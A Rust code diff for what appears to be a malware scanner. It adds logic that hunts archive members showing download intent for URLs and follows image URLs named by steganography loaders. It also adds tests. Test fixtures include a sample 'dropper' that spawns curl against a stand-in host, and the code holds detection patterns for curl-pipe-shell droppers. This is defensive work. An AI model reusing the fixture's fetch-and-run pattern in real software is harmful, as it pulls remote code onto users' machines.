@@ -1153,6 +1153,10 @@ pub(crate) fn orchestrate(
             CiRefs::Skip
         },
     );
+    // Image URLs whose declaring file shows a stego loader: exempt from the
+    // page-asset extension filter below. Hop 0 only — later hops hunt payload
+    // bytes before any analysis, so there are no findings to vouch for one.
+    let carriers = image_carrier_urls(report, &worklist);
     // Phantom-dependency signal: a package imperatively installed or loaded
     // somewhere in this artifact but absent from its manifest's declared deps —
     // a covertly-installed companion or a dependency-confusion target. Computed
@@ -1387,6 +1391,7 @@ pub(crate) fn orchestrate(
                         if r.kind == RefKind::UrlFetch
                             && !looks_like_dropper_download_url(url)
                             && !is_eval_pipeline_url(r)
+                            && !carriers.contains(url)
                         {
                             tracing::debug!(
                                 url = %url,
@@ -3710,6 +3715,7 @@ fn collect_references(
             merge_into_root(&mut groups, &root.sha256, hunted);
         }
     }
+    hunt_download_members(report, root_path, ci, &mut groups);
     // Filefacts owns Go's module/workspace semantics. Include raw root hunts
     // in the inputs so they cannot reintroduce an unreconciled declaration.
     let go_members: Vec<_> = report
@@ -3748,6 +3754,200 @@ fn collect_references(
         }
     }
     groups
+}
+
+/// Most archive members a single scan re-reads for a text hunt. Each read
+/// decompresses the root archive up to that member, so a crafted archive
+/// packing many flagged members cannot turn the hunt into a decompression
+/// storm; the members past the cap keep their declared references.
+const MEMBER_HUNT_MAX: usize = 16;
+
+/// Trait-id namespaces whose findings show that a file downloads something in
+/// order to run it: dropper objectives, a pipeline into a shell, and a process
+/// spawn of `curl`/`wget`. Ordered most- to least-specific; the first match
+/// names the reason a member was hunted.
+fn download_intent(findings: &[Finding]) -> Option<&str> {
+    let rank = |id: &str| {
+        if id.starts_with("objectives/command-and-control/dropper/") {
+            Some(0)
+        } else if id.starts_with("micro-behaviors/process/create/shell/pipeline") {
+            Some(1)
+        } else if id.starts_with("micro-behaviors/process/create/")
+            && (id.contains("curl") || id.contains("wget"))
+        {
+            Some(2)
+        } else {
+            None
+        }
+    };
+    findings
+        .iter()
+        .filter_map(|f| rank(&f.id).map(|r| (r, f.id.as_str())))
+        .min_by_key(|(r, _)| *r)
+        .map(|(_, id)| id)
+}
+
+/// Give archive members that show download intent the raw-text hunt the root
+/// gets. A member's bytes are discarded after analysis, so a URL a source file
+/// hands to a spawned `curl` — in any language, including ones with no
+/// dedicated recognizer — never reached the work list: only the root's bytes
+/// are re-read. The member's own findings are the gate, so an ordinary source
+/// tree costs nothing; a flagged member is re-extracted from the root archive
+/// and hunted like a root. Its references keep their recognizer as `source`,
+/// suffixed with the trait that justified the hunt, so every later fetch or
+/// skip decision in the log names why the reference was considered at all.
+fn hunt_download_members(
+    report: &AnalysisReport,
+    root_path: &Path,
+    ci: CiRefs,
+    groups: &mut Vec<(String, Vec<Reference>)>,
+) {
+    let Some((root, members)) = report.files.split_first() else {
+        return;
+    };
+    let prefix = format!("{}!!", root.path);
+    let mut hunted_members = 0usize;
+    for file in members {
+        if ci == CiRefs::Skip && is_ci_context(&file.file_type) {
+            continue;
+        }
+        let Some(trigger) = download_intent(&file.findings) else {
+            continue;
+        };
+        // Only a direct member of the root archive can be re-read: a nested
+        // archive member (`!!`) or a decoded layer (`##`) has no path in it.
+        let Some(member) = file
+            .path
+            .strip_prefix(&prefix)
+            .filter(|m| !m.contains("!!") && !m.contains("##"))
+        else {
+            tracing::debug!(
+                member = %file.path,
+                trigger,
+                "download intent in a nested or decoded member; bytes not re-readable, text hunt skipped"
+            );
+            continue;
+        };
+        if file.size > ROOT_HUNT_MAX_BYTES {
+            tracing::debug!(
+                member,
+                trigger,
+                size = file.size,
+                "download intent in an oversized member; text hunt skipped"
+            );
+            continue;
+        }
+        if hunted_members == MEMBER_HUNT_MAX {
+            tracing::info!(
+                cap = MEMBER_HUNT_MAX,
+                "member text-hunt cap reached; remaining flagged members keep declared references only"
+            );
+            break;
+        }
+        hunted_members += 1;
+        let bytes = match cleave::extract_member(root_path, member) {
+            Ok(Some(bytes)) => bytes,
+            Ok(None) => {
+                tracing::debug!(
+                    member,
+                    trigger,
+                    "flagged member not re-readable from the root archive; text hunt skipped"
+                );
+                continue;
+            }
+            Err(e) => {
+                tracing::warn!(member, trigger, "re-reading flagged member failed: {e:#}");
+                continue;
+            }
+        };
+        let mut hunted = find::references_in_bytes(&bytes, member);
+        for reference in &mut hunted {
+            reference.source = format!("{} via {trigger}", reference.source);
+        }
+        tracing::info!(
+            member,
+            trigger,
+            references = hunted.len(),
+            "member shows download intent; hunted its text for references"
+        );
+        if !hunted.is_empty() {
+            merge_into_root(groups, &file.sha256, hunted);
+        }
+    }
+}
+
+/// Image extensions a stego loader carves its payload out of.
+const IMAGE_CARRIER_EXTENSIONS: &[&str] = &["avif", "bmp", "gif", "jpeg", "jpg", "png", "webp"];
+
+/// Whether a file's findings show it pulls a payload out of an image: a
+/// stego-loader or steganography trait, or an image URL alongside a dropper
+/// execution trait. Returns the trait that says so.
+fn image_carrier_evidence(findings: &[Finding]) -> Option<&str> {
+    let ids = || findings.iter().map(|f| f.id.as_str());
+    ids()
+        .find(|id| {
+            id.starts_with("objectives/command-and-control/dropper/execution/stego-loader")
+                || id.starts_with("objectives/anti-static/obfuscation/steganography/")
+        })
+        .or_else(|| {
+            let image_url = ids()
+                .any(|id| id == "micro-behaviors/communications/http/url/path::image-file-url");
+            image_url
+                .then(|| {
+                    ids().find(|id| {
+                        id.starts_with("objectives/command-and-control/dropper/execution/")
+                    })
+                })
+                .flatten()
+        })
+}
+
+/// Image URLs that are payload carriers rather than page assets. An image URL
+/// is normally skipped as a site resource (see [`NON_PAYLOAD_URL_EXTENSIONS`]);
+/// it is followed only when the file that names it also carries image-carrier
+/// evidence, so a README badge never costs a request but a loader's
+/// `screenshot.png` with a PE appended is fetched and analyzed.
+fn image_carrier_urls(
+    report: &AnalysisReport,
+    groups: &[(String, Vec<Reference>)],
+) -> HashSet<String> {
+    let mut carriers = HashSet::new();
+    for (sha, refs) in groups {
+        let Some((file, evidence)) = report
+            .files
+            .iter()
+            .filter(|f| &f.sha256 == sha)
+            .find_map(|f| image_carrier_evidence(&f.findings).map(|e| (f, e)))
+        else {
+            continue;
+        };
+        for reference in refs {
+            let RefLocator::Url(url) = &reference.locator else {
+                continue;
+            };
+            if reference.kind != RefKind::UrlFetch || !has_image_extension(url) {
+                continue;
+            }
+            tracing::info!(
+                url = %url,
+                source = %file.path,
+                evidence,
+                "image URL named by a stego loader; following it as a payload carrier"
+            );
+            carriers.insert(url.clone());
+        }
+    }
+    carriers
+}
+
+/// Whether a URL's path ends in an image extension.
+fn has_image_extension(url: &str) -> bool {
+    let Ok(parsed) = reqwest::Url::parse(url) else {
+        return false;
+    };
+    parsed.path().rsplit_once('.').is_some_and(|(_, ext)| {
+        IMAGE_CARRIER_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
+    })
 }
 
 /// Whether this root is one of our own provenance records rather than a
@@ -5787,6 +5987,180 @@ mod tests {
                 "pkg:golang/example.test/two@v1.0.0".into()
             ])
         );
+    }
+
+    /// A zstd-compressed tar on disk holding `members`, for the member re-read
+    /// path. Compressed like a real package, so the root's own text hunt sees
+    /// no member text and every hunted reference comes from the member path.
+    fn write_tar_zst(dir: &Path, members: &[(&str, &[u8])]) -> std::path::PathBuf {
+        let path = dir.join("sample.tar.zst");
+        let file = std::fs::File::create(&path).expect("create archive");
+        let encoder = zstd::Encoder::new(file, 0).expect("zstd encoder");
+        let mut builder = tar::Builder::new(encoder);
+        for (name, body) in members {
+            let mut header = tar::Header::new_ustar();
+            header.set_size(body.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            builder
+                .append_data(&mut header, name, *body)
+                .expect("append member");
+        }
+        builder
+            .into_inner()
+            .expect("finish tar")
+            .finish()
+            .expect("finish zstd");
+        path
+    }
+
+    const RUST_DROPPER: &[u8] = b"use std::process::{Command, Stdio};\n\
+        fn run() {\n\
+            let curl = Command::new(\"curl\")\n\
+                .args([\"-fsSL\", \"https://stage.test/bashlinux.sh\"])\n\
+                .stdout(Stdio::piped())\n\
+                .spawn();\n\
+        }\n";
+    const README: &[u8] = b"# tool\n\
+        [![Crates.io](https://img.shields.io/crates/v/tool.svg)](https://crates.io/crates/tool)\n\
+        Or run `curl -fsSL https://docs.test/install.sh`.\n";
+
+    #[test]
+    fn member_with_download_intent_is_hunted_for_spawned_urls() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let root = write_tar_zst(
+            tmp.path(),
+            &[("pkg/src/lib.rs", RUST_DROPPER), ("pkg/README.md", README)],
+        );
+        let root_path = root.to_string_lossy().into_owned();
+        let trigger =
+            "objectives/command-and-control/dropper/execution/pipe::spawned-curl-pipe-shell-rce";
+        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
+            "version": "3",
+            "files": [
+                { "id": 0, "path": root_path, "depth": 0, "file_type": "tar",
+                  "sha256": "aa".repeat(32), "size": 4096u64 },
+                { "id": 1, "parent_id": 0, "path": format!("{root_path}!!pkg/src/lib.rs"),
+                  "depth": 1, "file_type": "rust", "sha256": "bb".repeat(32),
+                  "size": RUST_DROPPER.len() as u64,
+                  "findings": [
+                      { "id": "micro-behaviors/process/create/system::rust-command" },
+                      { "id": trigger }
+                  ] },
+                // Same URL shape, no download-intent finding: never re-read.
+                { "id": 2, "parent_id": 0, "path": format!("{root_path}!!pkg/README.md"),
+                  "depth": 1, "file_type": "markdown", "sha256": "cc".repeat(32),
+                  "size": README.len() as u64 }
+            ]
+        }))
+        .expect("report deserializes");
+
+        let groups = collect_references(&report, &root, CiRefs::Skip);
+        let hunted: Vec<(&str, String, &str)> = groups
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .map(move |r| (sha.as_str(), locator_key(r), r.source.as_str()))
+            })
+            .collect();
+        assert_eq!(
+            hunted.len(),
+            1,
+            "only the flagged member is hunted: {hunted:?}"
+        );
+        let (sha, locator, source) = &hunted[0];
+        assert_eq!(*sha, "bb".repeat(32));
+        assert_eq!(locator, "https://stage.test/bashlinux.sh");
+        assert!(
+            source.ends_with(&format!(" via {trigger}")),
+            "reference names the trait that justified the hunt: {source}"
+        );
+    }
+
+    #[test]
+    fn download_intent_prefers_the_most_specific_trait() {
+        let findings: Vec<Finding> = serde_json::from_value(serde_json::json!([
+            { "id": "micro-behaviors/process/create/direct::rust-command-curl-wget" },
+            { "id": "micro-behaviors/process/create/shell/pipeline::curl-pipe-shell-text" },
+            { "id": "objectives/command-and-control/dropper/execution/pipe::process-api-call" },
+        ]))
+        .expect("findings deserialize");
+        assert_eq!(
+            download_intent(&findings),
+            Some("objectives/command-and-control/dropper/execution/pipe::process-api-call")
+        );
+        assert_eq!(
+            download_intent(&findings[..1]),
+            Some("micro-behaviors/process/create/direct::rust-command-curl-wget")
+        );
+        let benign: Vec<Finding> = serde_json::from_value(serde_json::json!([
+            { "id": "micro-behaviors/process/create/system::rust-command" },
+            { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
+        ]))
+        .expect("findings deserialize");
+        assert_eq!(download_intent(&benign), None);
+    }
+
+    #[test]
+    fn image_url_is_a_carrier_only_beside_stego_evidence() {
+        let url = |u: &str| Reference {
+            locator: RefLocator::Url(u.into()),
+            kind: RefKind::UrlFetch,
+            source: "rust".into(),
+            evidence: String::new(),
+            offset: 0,
+            pinned_hash: None,
+            content_sha256: None,
+        };
+        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
+            "version": "3",
+            "files": [
+                { "id": 0, "path": "loader.rs", "depth": 0, "file_type": "rust",
+                  "sha256": "aa".repeat(32), "size": 1u64,
+                  "findings": [{ "id": "objectives/command-and-control/dropper/execution/stego-loader::rust-downloaded-image-range-script-loader" }] },
+                { "id": 1, "path": "README.md", "depth": 1, "file_type": "markdown",
+                  "sha256": "bb".repeat(32), "size": 1u64,
+                  "findings": [{ "id": "micro-behaviors/communications/http/url/path::image-file-url" }] },
+                { "id": 2, "path": "install.sh", "depth": 1, "file_type": "shell",
+                  "sha256": "cc".repeat(32), "size": 1u64,
+                  "findings": [
+                      { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
+                      { "id": "objectives/command-and-control/dropper/execution/pipe::curl-pipe-shell" }
+                  ] }
+            ]
+        }))
+        .expect("report deserializes");
+        let groups = vec![
+            (
+                "aa".repeat(32),
+                vec![
+                    url("https://stage.test/screenshot_2.png"),
+                    url("https://stage.test/index.html"),
+                ],
+            ),
+            // An image URL with no carrier evidence: a README badge.
+            (
+                "bb".repeat(32),
+                vec![url("https://img.shields.io/crates/v/tool.PNG")],
+            ),
+            // An image URL beside a dropper execution trait.
+            (
+                "cc".repeat(32),
+                vec![url("https://stage.test/cover.JPG?v=2")],
+            ),
+        ];
+        let carriers = image_carrier_urls(&report, &groups);
+        assert_eq!(
+            carriers,
+            HashSet::from([
+                "https://stage.test/screenshot_2.png".to_string(),
+                "https://stage.test/cover.JPG?v=2".to_string(),
+            ])
+        );
+        // Carrier or not, an ordinary image URL still fails the download shape.
+        assert!(!looks_like_dropper_download_url(
+            "https://img.shields.io/crates/v/tool.png"
+        ));
     }
 
     #[test]
